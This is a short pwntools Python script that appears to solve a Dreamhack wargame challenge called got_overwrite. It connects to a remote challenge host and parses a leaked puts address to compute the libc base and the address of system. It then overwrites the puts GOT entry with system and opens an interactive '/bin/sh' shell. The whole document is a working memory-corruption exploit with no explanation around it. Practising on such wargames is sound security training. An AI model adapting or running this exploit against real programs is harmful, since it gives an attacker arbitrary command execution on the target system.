from pwn import *
#p = process('./got_overwrite')
p = remote('host3.dreamhack.games', 12804)
e = ELF('./got_overwrite')
libc = ELF('./libc.so.6')
p.recvuntil(b'puts: ')
leaked_puts_addr = int(p.recvline(), 16)
libc_base = leaked_puts_addr - libc.symbols['puts']
puts_got = e.got['puts']
system_addr = libc_base + libc.symbols['system']
p.sendafter(b': ', b'/bin/sh\n')
p.sendafter(b': ', p64(puts_got))
p.sendafter(b': ', p64(system_addr))

p.interactive()